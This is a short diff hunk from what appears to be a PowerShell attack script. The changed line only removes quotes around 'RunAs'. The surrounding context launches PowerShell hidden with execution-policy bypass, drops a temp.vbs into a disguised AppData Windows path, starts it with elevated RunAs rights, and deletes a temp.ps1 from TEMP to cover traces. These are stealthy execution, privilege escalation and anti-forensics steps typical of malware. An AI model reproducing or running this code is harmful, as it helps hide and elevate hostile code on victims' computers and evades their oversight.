@@ -518,7 +518,7 @@ objShell.Run "powershell.exe -NonI -NoP -Exec Bypass -W Hidden -File ""%APPDATA%
     $pth = "$env:APPDATA\Microsoft\Windows\temp.vbs"
     $tobat | Out-File -FilePath $pth -Force
     sleep 2
-    Start-Process -FilePath $pth -Verb "RunAs"
+    Start-Process -FilePath $pth -Verb RunAs
     rm -path "$env:TEMP\temp.ps1" -Force
     }
 }
